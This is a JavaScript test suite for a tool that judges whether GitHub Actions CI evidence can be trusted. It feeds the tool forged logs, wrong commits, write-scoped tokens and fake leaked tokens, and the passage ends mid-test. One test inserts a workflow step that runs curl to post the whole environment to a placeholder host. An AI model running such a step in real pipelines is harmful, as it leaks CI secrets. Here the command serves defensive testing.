// CI evidence: what a reviewer may rely on, and what must never be believed. Built on the REAL data of the first live run
// (run 43995081483, job 133745025105, commit 0aba5e8…), plus hostile variations of it.
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { main } from "../ci-evidence.mjs";
import {
  EvidenceError, MANDATORY_CHECK_IDS, buildEvidenceDocument, buildGithubCi, compareRunHeaders, expectationsFromWorkflow, normalizeChecks, normalizeJobs, normalizeRun, parseJobLog,
} from "../lib/ci-evidence.mjs";
import { validate } from "../lib/json-schema.mjs";
import { trustedBaseCheck } from "../lib/trusted-base.mjs";
import { makeRepo } from "./git-fixture.mjs";
import { FROZEN_POLICY_PATH, FROZEN_WORKFLOW_PATH, ROOT, frozenPolicy, frozenWorkflowText, readJson, sink } from "./helpers.mjs";

const LIVE_SHA = "0aba5e8f2c5f4971b3b7280e0a4cd23e4a5a9b75";
const REPOSITORY = "mahmoud-hany-eng/m1pcs-website";
const BRANCH = "claude/ops-0002-ci-baseline";
const FIX = path.join(ROOT, "ops", "tests", "fixtures", "ci");
const raw = (name) => fs.readFileSync(path.join(FIX, `live-run-43995081483.${name}`), "utf8");
const schema = readJson("docs/project-memory/schemas/ci-evidence.schema.json");
const policy = frozenPolicy();
const workflowText = frozenWorkflowText();
const COLLECTOR = { tool: "ops/ci-evidence.mjs", tool_source: "working_tree", role: "human" };
const NOW = new Date("2026-01-02T03:04:05Z");

/** The live data, deep-copied, optionally re-addressed to another commit so that it can be paired with a test repository. */
function live(sha = LIVE_SHA) {
  const swap = (text) => JSON.parse(text.replaceAll(LIVE_SHA, sha));
  return { run: swap(raw("run.json")), jobs: swap(raw("jobs.json")), checks: swap(raw("check-runs.synthetic.json")), log: raw("job.log.txt") };
}
const expectations = (over = {}) => ({ ...expectationsFromWorkflow(workflowText, policy, { repository: REPOSITORY, headSha: LIVE_SHA, branch: BRANCH }), ...over });
const build = (d, over = {}) => buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectations(over) });
const failed = (ci) => ci.consistency.filter((c) => !c.passed).map((c) => c.id);
const blocking = (ci) => ci.consistency.filter((c) => !c.passed && c.blocking).map((c) => c.id);
const throwsEv = (fn, code) => assert.throws(fn, (err) => err instanceof EvidenceError && err.code === code, `expected ${code}`);
const jobOf = (d) => (Array.isArray(d.jobs.jobs) ? d.jobs.jobs[0] : d.jobs[0]);

test("the real first live run is read exactly as GitHub reported it", () => {
  const ci = build(live());
  assert.deepEqual(failed(ci), [], JSON.stringify(ci.consistency.filter((c) => !c.passed)));
  assert.equal(ci.workflow_run.id, 43995081483);
  assert.equal(ci.workflow_run.head_sha, LIVE_SHA);
  assert.equal(ci.workflow_run.conclusion, "success");
  assert.equal(ci.workflow_run.event, "push");
  assert.equal(ci.workflow_run.workflow_path, ".github/workflows/ci.yml");
  assert.equal(ci.workflow_run.run_attempt, 1);
  assert.equal(ci.jobs.length, 1);
  assert.equal(ci.jobs[0].id, 133745025105);
  assert.equal(ci.jobs[0].conclusion, "success");
  const userSteps = ci.jobs[0].steps.filter((s) => !/^(Set up job|Complete job|Post )/.test(s.name));
  assert.deepEqual(userSteps.map((s) => s.name), ["Check out the repository", "Set up Node.js", "Guard - no provider credential in this job", "Install dependencies without running install scripts", "Lint", "Type check", "Validate project memory and workflows", "Run the operations tests", "Build"]);
  assert.ok(userSteps.every((s) => s.conclusion === "success"));
  assert.deepEqual(ci.token_permissions, { source: "job_log", permissions: [{ scope: "contents", access: "read" }, { scope: "metadata", access: "read" }] });
});

test("test evidence is read only from the step that prints it, and is labelled a claim", () => {
  const t = build(live()).test_evidence;
  assert.deepEqual([t.tests, t.pass, t.fail, t.cancelled, t.skipped], [353, 353, 0, 0, 0]);
  assert.equal(t.validate_files_checked, 93);
  assert.equal(t.build_static_pages, 56);
  assert.equal(t.authority, "claim_by_output_of_the_code_under_test");
  assert.equal(t.source, "job_log_parse");
});

test("a forged test summary printed by another step is ignored", () => {
  const d = live();
  d.log = d.log.replace("##[group]Run npm run lint\n", "##[group]Run npm run lint\n# tests 99999\n# pass 99999\n# fail 0\nOK: checked 1 file(s); 0 warning(s).\nGenerating static pages (1/1)\n");
  // ... and a later step, so that "last match anywhere in the log" would pick it up
  d.log = d.log.replace("##[group]Run npm run build\n", "##[group]Run npm run build\n# tests 77777\n# pass 77777\n# fail 0\nOK: checked 2 file(s); 0 warning(s).\n");
  const t = build(d).test_evidence;
  assert.deepEqual([t.tests, t.pass, t.fail], [353, 353, 0]);
  assert.equal(t.validate_files_checked, 93);
  assert.equal(t.build_static_pages, 56);
});

test("a log that shows failures although the job succeeded is reported, but a log can never decide alone", () => {
  const d = live();
  d.log = d.log.replace("# fail 0", "# fail 2");
  const ci = build(d);
  assert.deepEqual(failed(ci), ["log.tests_clean_as_printed"]);
  assert.deepEqual(blocking(ci), []);
  assert.equal(ci.test_evidence.fail, 2);
  const none = buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: "no summary here\n", expected: expectations() });
  assert.equal(none.test_evidence.tests, null);
});

test("a run for another commit is rejected", () => {
  const ci = build(live(), { head_sha: "f".repeat(40) });
  assert.ok(blocking(ci).includes("run.head_sha_is_expected"));
  const d = live();
  jobOf(d).head_sha = "e".repeat(40);
  assert.ok(blocking(build(d)).includes("jobs.bound_to_run_and_commit"));
});

test("a job that belongs to a different run is rejected", () => {
  const d = live();
  jobOf(d).run_id = 1;
  assert.ok(blocking(build(d)).includes("jobs.bound_to_run_and_commit"));
});

test("a run of some other workflow file is rejected, whatever its name says", () => {
  const d = live();
  d.run.path = ".github/workflows/deploy.yml";
  d.run.name = "CI";
  assert.ok(blocking(build(d)).includes("run.workflow_path_is_expected"));
  const refd = live();
  refd.run.path = ".github/workflows/ci.yml@refs/heads/claude/ops-0002-ci-baseline";
  assert.deepEqual(failed(build(refd)), [], "the @ref suffix GitHub appends to a run path is not part of the path");
});

test("events outside the approved list are rejected", () => {
  for (const event of ["pull_request_target", "workflow_dispatch", "workflow_run", "schedule", "repository_dispatch"]) {
    const d = live();
    d.run.event = event;
    assert.ok(blocking(build(d)).includes("run.event_is_allowed"), event);
  }
  for (const event of ["push", "pull_request"]) {
    const d = live();
    d.run.event = event;
    assert.ok(!blocking(build(d)).includes("run.event_is_allowed"), event);
  }
});

test("only a completed, successful run passes", () => {
  for (const [status, conclusion] of [["completed", "failure"], ["completed", "cancelled"], ["completed", "skipped"], ["completed", "neutral"], ["completed", "timed_out"], ["in_progress", null], ["queued", null], ["completed", null]]) {
    const d = live();
    d.run.status = status;
    d.run.conclusion = conclusion;
    assert.ok(blocking(build(d)).includes("run.completed_successfully"), `${status}/${conclusion}`);
  }
});

test("a run on another branch is rejected when a branch is expected", () => {
  const d = live();
  d.run.head_branch = "claude/something-else";
  assert.ok(blocking(build(d)).includes("run.branch_is_expected"));
});

test("a re-run and a run from a fork are reported but are not blocking", () => {
  const d = live();
  d.run.run_attempt = 2;
  d.run.head_repository = { full_name: "someone-else/fork" };
  const ci = build(d);
  assert.deepEqual(failed(ci).sort(), ["run.first_attempt", "run.not_from_fork"]);
  assert.deepEqual(blocking(ci), []);
  assert.match(ci.consistency.find((c) => c.id === "run.first_attempt").detail, /a re-run/);
});

test("a job or step that did not succeed fails the evidence, and a skipped step is not a success", () => {
  for (const conclusion of ["failure", "cancelled", "skipped", null]) {
    const d = live();
    jobOf(d).steps.find((s) => s.name === "Type check").conclusion = conclusion;
    const ci = build(d);
    assert.ok(blocking(ci).includes("steps.all_succeeded"), String(conclusion));
    assert.match(ci.consistency.find((c) => c.id === "steps.all_succeeded").detail, /Type check/);
  }
  const d = live();
  jobOf(d).conclusion = "failure";
  assert.ok(blocking(build(d)).includes("jobs.completed_successfully"));
});

test("the steps must be exactly the steps of the TRUSTED workflow: none missing, none added, none renamed", () => {
  const steps = (d) => jobOf(d).steps;
  const missing = live();
  jobOf(missing).steps = steps(missing).filter((s) => s.name !== "Lint");
  assert.ok(blocking(build(missing)).includes("steps.exactly_the_expected_sequence"));
  const added = live();
  steps(added).splice(3, 0, { name: "Send the environment to a server", status: "completed", conclusion: "success", number: 99 });
  assert.ok(blocking(build(added)).includes("steps.exactly_the_expected_sequence"));
  const renamed = live();
  steps(renamed).find((s) => s.name === "Lint").name = "Lint (really)";
  assert.ok(blocking(build(renamed)).includes("steps.exactly_the_expected_sequence"));
  const reordered = live();
  const s = steps(reordered);
  [s[5], s[6]] = [s[6], s[5]];
  assert.ok(blocking(build(reordered)).includes("steps.exactly_the_expected_sequence"));
});

test("a branch that rewrote its own workflow cannot make its steps the expected ones: expectations come from the base's file", () => {
  const rewritten = workflowText.replace("      - name: Build\n", "      - name: Send the environment to a server\n        run: curl -d \"$(env)\" https://example.invalid\n\n      - name: Build\n");
  assert.notEqual(rewritten, workflowText, "the rewrite must really change the workflow");
  const d = live();
  const added = { name: "Send the environment to a server", status: "completed", conclusion: "success", number: 99 };
  jobOf(d).steps.splice(9, 0, added);
  assert.deepEqual(failed(build(d)).includes("steps.exactly_the_expected_sequence"), true, "judged against the base's workflow, the extra step is a mismatch");
  const asRewritten = buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectationsFromWorkflow(rewritten, policy, { repository: REPOSITORY, headSha: LIVE_SHA, branch: BRANCH }) });
  assert.ok(!failed(asRewritten).includes("steps.exactly_the_expected_sequence"), "judged against the branch's own workflow it would pass, which is exactly why the base's file is used");
});

test("a second job, or a job with another name, is rejected", () => {
  const d = live();
  const second = structuredClone(jobOf(d));
  second.id = 2;
  second.name = "deploy";
  d.jobs.jobs.push(second);
  d.jobs.total_count = 2;
  assert.ok(blocking(build(d)).includes("jobs.exactly_one_expected_job"));
  const renamed = live();
  jobOf(renamed).name = "verify-but-different";
  assert.ok(blocking(build(renamed)).includes("jobs.exactly_one_expected_job"));
  const none = live();
  none.jobs.jobs = [];
  assert.ok(blocking(build(none)).includes("jobs.exactly_one_expected_job"));
});

test("check runs must come from the github-actions app and match each job", () => {
  const check = (d) => d.checks.check_runs[0];
  const otherApp = live();
  check(otherApp).app = { slug: "some-other-app" };
  assert.ok(blocking(build(otherApp)).includes("checks.match_jobs_from_actions_app"));
  const noApp = live();
  delete check(noApp).app;
  assert.ok(blocking(build(noApp)).includes("checks.match_jobs_from_actions_app"));
  const otherConclusion = live();
  check(otherConclusion).conclusion = "neutral";
  assert.ok(blocking(build(otherConclusion)).includes("checks.match_jobs_from_actions_app"));
  const otherId = live();
  check(otherId).id = 7;
  assert.ok(blocking(build(otherId)).includes("checks.match_jobs_from_actions_app"));
  const empty = live();
  empty.checks.check_runs = [];
  assert.ok(blocking(build(empty)).includes("checks.match_jobs_from_actions_app"));
  assert.equal(buildGithubCi({ run: live().run, jobs: live().jobs, expected: expectations() }).checks, null, "check runs are optional");
});

test("the token must have been read-only", () => {
  const writes = live();
  writes.log = writes.log.replace("Contents: read", "Contents: write");
  assert.ok(blocking(build(writes)).includes("log.token_is_read_only"));
  const extra = live();
  extra.log = extra.log.replace("Metadata: read\n", "Metadata: read\nPackages: write\nId-Token: write\n");
  const ci = build(extra);
  assert.ok(blocking(ci).includes("log.token_is_read_only"));
  assert.match(ci.consistency.find((c) => c.id === "log.token_is_read_only").detail, /packages: write.*id-token: write/);
  const none = live();
  none.log = none.log.replace(/##\[group\]GITHUB_TOKEN Permissions\n[^]*?##\[endgroup\]\n/, "");
  assert.ok(blocking(build(none)).includes("log.token_is_read_only"), "a log without the permission block proves nothing");
});

test("nothing outside the whitelist reaches the output: secrets and extra fields in the inputs are dropped", () => {
  const d = live();
  d.run.token = "ghp_LEAK_RUN";
  d.run.actor = { login: "someone", email: "leak@example.com", token: "ghp_LEAK_ACTOR" };
  d.run.head_commit = { message: "ghp_LEAK_COMMIT", author: { email: "leak2@example.com" } };
  const j = jobOf(d);
  j.token = "ghp_LEAK_JOB";
  j.steps[4].outputs = { secret: "ghp_LEAK_STEP" };
  d.checks.check_runs[0].output = { text: "ghp_LEAK_CHECK" };
  d.log = d.log.replace("##[group]Run npm run lint\n", "##[group]Run npm run lint\nghp_LEAK_LOG\nAuthorization: Bearer ghp_LEAK_LOG2\n");
  const doc = buildEvidenceDocument({ repository: REPOSITORY, headSha: LIVE_SHA, githubCi: build(d), collector: COLLECTOR, now: NOW });
  const text = JSON.stringify(doc);
  assert.ok(!/LEAK|leak@|leak2@|ghp_/.test(text), "no input value outside the whitelist may reach the output");
  assert.deepEqual(validate(schema, doc).errors, []);
});

test("every field is capped, so a huge input cannot produce a huge output", () => {
  const d = live();
  d.run.name = "x".repeat(100000);
  d.run.html_url = "h".repeat(100000);
  jobOf(d).steps[0].name = "y".repeat(100000);
  const ci = build(d);
  assert.ok(ci.workflow_run.workflow_name.length <= 400);
  assert.ok(ci.workflow_run.html_url.length <= 400);
  assert.ok(ci.jobs[0].steps[0].name.length <= 400);
});

test("malformed GitHub data is refused, never guessed at", () => {
  const good = live();
  for (const bad of [null, [], "run", 5, {}, { ...good.run, id: "1" }, { ...good.run, head_sha: "abc123" }, { ...good.run, event: undefined }, { ...good.run, status: 3 }]) {
    throwsEv(() => normalizeRun(bad), "EV-SHAPE");
  }
  for (const bad of [null, "jobs", {}, { jobs: "x" }, [null], [{ id: 1, name: "a" }], [{ id: 1, name: "a", head_sha: "f".repeat(40) }], [{ id: "1", name: "a", head_sha: "f".repeat(40), steps: [] }]]) {
    throwsEv(() => normalizeJobs(bad), "EV-SHAPE");
  }
  for (const bad of [null, {}, "x", [{}], [{ id: 1, name: "n", head_sha: "short" }]]) throwsEv(() => normalizeChecks(bad), "EV-SHAPE");
  throwsEv(() => parseJobLog(42), "EV-SHAPE");
  assert.deepEqual(normalizeJobs(good.jobs).map((j) => j.id), [133745025105]);
  assert.deepEqual(normalizeJobs(good.jobs.jobs).map((j) => j.id), [133745025105], "a bare list is accepted too");
});

test("expectations come from the trusted workflow and policy, and fail closed when they cannot", () => {
  const e = expectations();
  assert.equal(e.workflow_path, ".github/workflows/ci.yml");
  assert.equal(e.job_name, "verify");
  assert.deepEqual(e.allowed_events, ["push", "pull_request"]);
  assert.equal(e.step_names.length, 9);
  assert.deepEqual(e.commands, { test: "npm run ops:test", validate: "npm run ops:validate", build: "npm run build" });
  const twoJobs = `${workflowText}  second:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n`;
  throwsEv(() => expectationsFromWorkflow(twoJobs, policy, { repository: REPOSITORY, headSha: LIVE_SHA }), "EV-WORKFLOW");
  throwsEv(() => expectationsFromWorkflow("name: CI\non: push\n", policy, { repository: REPOSITORY, headSha: LIVE_SHA }), "EV-WORKFLOW");
  const { workflow_policy: omitted, ...withoutWorkflowPolicy } = policy;
  assert.ok(omitted, "the real policy must have a workflow policy for this test to remove");
  throwsEv(() => expectationsFromWorkflow(workflowText, withoutWorkflowPolicy, { repository: REPOSITORY, headSha: LIVE_SHA }), "EV-WORKFLOW");
  throwsEv(() => expectationsFromWorkflow(workflowText, null, { repository: REPOSITORY, headSha: LIVE_SHA }), "EV-WORKFLOW");
});

test("the evidence library never touches the network, a process or a credential", () => {
  const src = fs.readFileSync(path.join(ROOT, "ops/lib/ci-evidence.mjs"), "utf8");
  const imports = [...src.matchAll(/^import .* from "([^"]+)";/gm)].map((m) => m[1]);
  assert.deepEqual(imports, ["./mini-yaml.mjs"]);
  assert.ok(!/process\.env|child_process|fetch\(|XMLHttpRequest|https?:\/\/(?!github\.com)/.test(src.replace(/\/\/.*$/gm, "")), "no environment, process or network access");
  const cli = fs.readFileSync(path.join(ROOT, "ops/ci-evidence.mjs"), "utf8").replace(/\/\/.*$/gm, "");
  assert.ok(!/process\.env|child_process|fetch\(|https?\.request|node:net|node:http/.test(cli), "the CLI reads files and git only");
});

/* ------------------------------------------------ the document, with a trusted-base section */

const repo = makeRepo();
after(() => repo.cleanup());
repo.branch("clean-docs", (r) => r.write("docs/example-guide.md", "# A guide\n"));
repo.branch("checker-edit-only", (r) => r.write("ops/lib/workflow-safety.mjs", `${r.read("ops/lib/workflow-safety.mjs")}\n// harmless comment\n`));
repo.branch("weaken-ci", (r) => {
  r.edit(".github/workflows/ci.yml", "permissions:\n  contents: read", "permissions:\n  contents: write");
  r.edit("docs/project-memory/policy/policy.json", '"max_token_permissions": { "contents": "read" }', '"max_token_permissions": { "contents": "write" }');
});
repo.branch("touch-site", (r) => r.write("src/app/page.tsx", "export default function Page() { return 4; }\n"));
const sha = (rev) => repo.git("rev-parse", rev).trim();

/** A document for `rev` as it would be built from a green run of the BASE's workflow at that commit. */
function documentFor(rev, { mutate = () => {}, ci = true } = {}) {
  const head = sha(rev);
  const d = live(head);
  mutate(d);
  const trustedBase = trustedBaseCheck({ repoDir: repo.dir, base: "main", head });
  const githubCi = ci ? buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectations({ head_sha: head, branch: null }) }) : null;
  return buildEvidenceDocument({ repository: REPOSITORY, headSha: head, baseSha: sha("main"), trustedBase, githubCi, collector: COLLECTOR, now: NOW });
}

test("a green run of an unchanged CI definition is evidence, and needs no human", () => {
  const doc = documentFor("clean-docs");
  assert.equal(doc.verdict.ci_passed, true);
  assert.equal(doc.verdict.ci_trust_basis, "ci_definition_unchanged_from_base");
  assert.equal(doc.verdict.control_plane_changed, false);
  assert.equal(doc.verdict.human_review_required, false, doc.verdict.reasons.join("; "));
  assert.equal(doc.verdict.evidence_complete, true);
  assert.deepEqual(validate(schema, doc).errors, []);
});

test("a green run of a CHANGED CI definition is not evidence about that change, and always needs a human", () => {
  for (const rev of ["checker-edit-only", "weaken-ci"]) {
    const doc = documentFor(rev);
    assert.equal(doc.verdict.ci_passed, true, `${rev}: CI itself reports green`);
    assert.equal(doc.verdict.ci_trust_basis, "ci_definition_modified_from_base", rev);
    assert.equal(doc.verdict.human_review_required, true, rev);
    assert.ok(doc.verdict.reasons.some((r) => /its green result is not evidence/.test(r)), rev);
    assert.deepEqual(validate(schema, doc).errors, [], rev);
  }
});

test("a green run does not hide a protected-path change", () => {
  const doc = documentFor("touch-site");
  assert.equal(doc.verdict.ci_trust_basis, "ci_definition_unchanged_from_base");
  assert.equal(doc.verdict.human_review_required, true);
  assert.ok(doc.verdict.reasons.some((r) => /protected/i.test(r)));
});

test("a run that was for a different commit than the one judged fails the evidence outright", () => {
  const head = sha("clean-docs");
  const d = live(sha("touch-site"));
  const trustedBase = trustedBaseCheck({ repoDir: repo.dir, base: "main", head });
  const githubCi = buildGithubCi({ run: d.run, jobs: d.jobs, checkRuns: d.checks, jobLog: d.log, expected: expectations({ head_sha: head, branch: null }) });
  const doc = buildEvidenceDocument({ repository: REPOSITORY, headSha: head, baseSha: sha("main"), trustedBase, githubCi, collector: COLLECTOR, now: NOW });
  assert.equal(doc.verdict.ci_passed, false);
  assert.equal(doc.verdict.human_review_required, true);
  assert.equal(doc.verdict.evidence_complete, false);
});

test("a failed run needs a human, however clean the change", () => {
  const doc = documentFor("clean-docs", { mutate: (d) => { d.run.conclusion = "failure"; jobOf(d).conclusion = "failure"; d.checks.check_runs[0].conclusion = "failure"; } });
  assert.equal(doc.verdict.ci_passed, false);
  assert.equal(doc.verdict.human_review_required, true);
});

test("GitHub data without any base check is never enough on its own", () => {
  const d = live();
  const githubCi = build(d);
  const doc = buildEvidenceDocument({ repository: REPOSITORY, headSha: LIVE_SHA, githubCi, collector: COLLECTOR, now: NOW });
  assert.equal(doc.verdict.ci_trust_basis, "base_unchecked");
  assert.equal(doc.verdict.human_review_required, true);
  assert.equal(doc.verdict.evidence_complete, false);
  assert.equal(doc.trusted_base, null);
});

test("a base check without GitHub data is incomplete but needs no human by itself", () => {
  const doc = documentFor("clean-docs", { ci: false });
  assert.equal(doc.verdict.ci_passed, null);
  assert.equal(doc.verdict.ci_trust_basis, "ci_not_collected");
  assert.equal(doc.verdict.evidence_complete, false);
  assert.equal(doc.verdict.human_review_required, false);
  assert.deepEqual(validate(schema, doc).errors, []);
  assert.throws(() => buildEvidenceDocument({ repository: REPOSITORY, headSha: LIVE_SHA, collector: COLLECTOR }), (e) => e.code === "EV-ARGS");
  assert.throws(() => buildEvidenceDocument({ repository: "not a repo", headSha: LIVE_SHA, githubCi: build(live()), collector: COLLECTOR }), (e) => e.code === "EV-ARGS");
  assert.throws(() => buildEvidenceDocument({ repository: REPOSITORY, headSha: "main", githubCi: build(live()), collector: COLLECTOR }), (e) => e.code === "EV-ARGS");
});

test("the document says what it is: unauthenticated tool output, never proof of origin", () => {
  const doc = documentFor("clean-docs");
  assert.equal(doc.trust.level, "unauthenticated_tool_output");
  assert.equal(doc.trust.authenticated_by_github, false);
  assert.match(doc.trust.note, /never accept an evidence file produced by the branch under review/);
  assert.equal(doc.trusted_base.verdict.enforcement, "advisory_only");
  assert.equal(doc.trusted_base.execution_context.anchor_is_claim, true);
});

test("the schema rejects a document that claims more than it can", () => {
  const good = documentFor("clean-docs");
  assert.deepEqual(validate(schema, good).errors, []);
  const tamper = (fn) => {
    const doc = structuredClone(good);
    fn(doc);
    return validate(schema, doc);
  };
  assert.equal(tamper((d) => { d.trust.level = "authenticated"; }).valid, false);
  assert.equal(tamper((d) => { d.trust.authenticated_by_github = true; }).valid, false);
  assert.equal(tamper((d) => { d.trusted_base.verdict.enforcement = "enforced"; }).valid, false);
  assert.equal(tamper((d) => { d.verdict.ci_trust_basis = "trusted"; }).valid, false);
  assert.equal(tamper((d) => { d.extra = 1; }).valid, false);
  assert.equal(tamper((d) => { delete d.verdict; }).valid, false);
  assert.equal(tamper((d) => { d.subject.head_sha = "main"; }).valid, false);
  assert.equal(tamper((d) => { d.github_ci.workflow_run.id = "1"; }).valid, false);
  assert.equal(tamper((d) => { d.evidence_kind = "something"; }).valid, false);
  assert.equal(tamper((d) => { d.generated_at = "yesterday"; }).valid, false);
});

test("the same inputs always give the same document", () => {
  assert.deepEqual(documentFor("weaken-ci"), documentFor("weaken-ci"));
});

/* --------------------------------------------------------------------- command line */

function run(args) {
  const out = sink();
  const err = sink();
  const code = main(args, out, err, { now: NOW });
  return { code, out: out.text(), err: err.text() };
}

test("command line: base check plus the live run data gives a complete document", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "m1-ci-cli-"));
  try {
    const head = sha("clean-docs");
    const d = live(head);
    const files = { run: "run.json", jobs: "jobs.json", checks: "checks.json" };
    fs.writeFileSync(path.join(dir, files.run), JSON.stringify(d.run));
    fs.writeFileSync(path.join(dir, files.jobs), JSON.stringify(d.jobs));
    fs.writeFileSync(path.join(dir, files.checks), JSON.stringify(d.checks));
    fs.writeFileSync(path.join(dir, "job.log"), d.log);
    const args = ["--repository", REPOSITORY, "--repo-dir", repo.dir, "--base", "main", "--head", "clean-docs", "--run", path.join(dir, files.run), "--jobs", path.join(dir, files.jobs), "--checks", path.join(dir, files.checks), "--log", path.join(dir, "job.log")];
    const ok = run(args);
    assert.equal(ok.code, 0, ok.err);
    const doc = JSON.parse(ok.out);
    assert.equal(doc.verdict.evidence_complete, true);
    assert.equal(doc.github_ci.test_evidence.tests, 353);
    assert.deepEqual(validate(schema, doc).errors, []);

    const outFile = path.join(dir, "evidence.json");
    assert.equal(run([...args, "--out", outFile]).code, 0);
    assert.deepEqual(JSON.parse(fs.readFileSync(outFile, "utf8")), doc);

    // the expectations come from the base revision's files, so a run of a different commit is a blocking failure
    const wrong = run(args.map((a) => (a === "clean-docs" ? "touch-site" : a)));
    assert.equal(wrong.code, 3);
    assert.equal(JSON.parse(wrong.out).verdict.ci_passed, false);

    // without a base, the trusted files must be named, and a green run alone still needs a human
    const noBase = run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", path.join(dir, files.run), "--jobs", path.join(dir, files.jobs), "--workflow-file", FROZEN_WORKFLOW_PATH, "--policy-file", FROZEN_POLICY_PATH]);
    assert.equal(noBase.code, 3, noBase.err);
    assert.equal(JSON.parse(noBase.out).verdict.ci_trust_basis, "base_unchecked");
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", path.join(dir, files.run), "--jobs", path.join(dir, files.jobs)]).code, 2);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("command line: a base that predates the workflow policy is a clean usage error, not a crash", () => {
  repo.branch("predates-ci-policy", (r) => r.editJson("docs/project-memory/policy/policy.json", (p) => { delete p.workflow_policy; }));
  repo.branch("policy-not-json", (r) => r.write("docs/project-memory/policy/policy.json", "{ not json"));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "m1-ci-cli-"));
  try {
    const d = live(sha("clean-docs"));
    fs.writeFileSync(path.join(dir, "run.json"), JSON.stringify(d.run));
    fs.writeFileSync(path.join(dir, "jobs.json"), JSON.stringify(d.jobs));
    for (const base of ["predates-ci-policy", "policy-not-json"]) {
      const r = run(["--repository", REPOSITORY, "--repo-dir", repo.dir, "--base", base, "--head", "clean-docs", "--run", path.join(dir, "run.json"), "--jobs", path.join(dir, "jobs.json")]);
      assert.equal(r.code, 2, `${base}: ${r.err}`);
      assert.match(r.err, /^(usage|TB-[A-Z-]+): /, "a clean, named refusal");
      assert.doesNotMatch(r.err, /internal error/);
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("command line: bad usage and bad input are refused with exit code 2, and a bad file never crashes it", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "m1-ci-cli-"));
  try {
    const notJson = path.join(dir, "not.json");
    fs.writeFileSync(notJson, "{ not json");
    const good = path.join(dir, "run.json");
    fs.writeFileSync(good, raw("run.json"));
    const jobs = path.join(dir, "jobs.json");
    fs.writeFileSync(jobs, raw("jobs.json"));
    const trusted = ["--workflow-file", FROZEN_WORKFLOW_PATH, "--policy-file", FROZEN_POLICY_PATH];
    assert.equal(run(["--help"]).code, 0);
    assert.equal(run([]).code, 2);
    assert.equal(run(["--repository", REPOSITORY]).code, 2);
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA]).code, 2);
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", good]).code, 2, "--run needs --jobs");
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", notJson, "--jobs", jobs, ...trusted]).code, 2);
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", path.join(dir, "missing.json"), "--jobs", jobs, ...trusted]).code, 2);
    assert.equal(run(["--repository", REPOSITORY, "--head", "main", "--run", good, "--jobs", jobs, ...trusted]).code, 2, "without --base the head must be a full commit id");
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted, "--surprise", "1"]).code, 2);
    assert.equal(run(["--repository", REPOSITORY, "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted, "--out"]).code, 2);
    assert.equal(run(["--repository", "no spaces allowed", "--head", LIVE_SHA, "--run", good, "--jobs", jobs, ...trusted]).code, 2);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

/* ================================================================================================================
 * OPS-0005B: fail-closed job-log parsing (F-1) and evidence that cannot read complete while mandatory checks never ran (F-2).
 * Every mutation below is applied to a copy of the REAL job log of the first live run (see fixtures/ci/README.md).
 * The log text is a claim by code that runs inside the job; these tests show what the parser refuses to believe, not that the
 * log has become trustworthy.
 * ============================================================================================================== */

const MANDATORY = [...MANDATORY_CHECK_IDS];
const GROUP_PERMISSIONS = "##[group]GITHUB_TOKEN Permissions";
const BLOCK = (access = "read") => `${GROUP_PERMISSIONS}\nContents: ${access}\nMetadata: read\n##[endgroup]\n`;
const TAP = (n) => `# tests ${n}\n# suites 0\n# pass ${n}\n# fail 0\n# cancelled 0\n# skipped 0\n`;
/** Insert `extra` right after the line that opens a step, i.e. text printed by that step's own code. */
const printedBy = (log, header, extra) => {
  assert.ok(log.includes(`${header}\n`), `the real log has the header ${header}`);
  return log.replace(`${header}\n`, `${header}\n${extra}`);
};
/** The real log with a write-access permission block, which is what a job that must not pass would print. */
const writeAccess = (log) => log.replace("Contents: read", "Contents: write");
const swapLines = (log, a, b) => log.replace(a, "\u0000a").replace(b, a).replace("\u0000a", b);
const ci = (d) => build(d);

test("F-1: the real log, as printed, has one initial permission block and every step header once and in order", () => {
  const d = live();
  const parsed = parseJobLog(d.log);
  assert.equal(parsed.permission_blocks, 1);
  assert.equal(parsed.permission_block_is_initial, true);
  assert.deepEqual(parsed.repeated_run_headers, []);
  assert.deepEqual(parsed.run_headers, expectations().step_headers.slice(1), "the log has every trusted step header but the first (this stored log is reduced and starts at the second step)");
  const result = ci(d);
  assert.deepEqual(failed(result), []);
  for (const id of MANDATORY) assert.ok(result.consistency.find((c) => c.id === id && c.blocking && c.passed), `${id} ran and held`);
});

test("F-1: a forged permission block printed by a later step does not replace the real one, and fails the evidence", () => {
  // the real block says write; a later step (the build runs branch code) prints a block that says read-only
  const hidden = live();
  hidden.log = printedBy(writeAccess(hidden.log), "##[group]Run npm run build", BLOCK("read"));
  const a = ci(hidden);
  assert.deepEqual(a.token_permissions.permissions, [{ scope: "contents", access: "write" }, { scope: "metadata", access: "read" }], "the first block is the one that is read");
  assert.deepEqual(blocking(a).sort(), ["log.permission_block_is_single_and_initial", "log.token_is_read_only"]);
  // the real block is genuine and read-only; the forgery changes nothing it reports, but two blocks still fail the evidence
  const dup = live();
  dup.log = printedBy(dup.log, "##[group]Run npm run build", BLOCK("read"));
  const b = ci(dup);
  assert.deepEqual(b.token_permissions.permissions, [{ scope: "contents", access: "read" }, { scope: "metadata", access: "read" }]);
  assert.deepEqual(blocking(b), ["log.permission_block_is_single_and_initial"]);
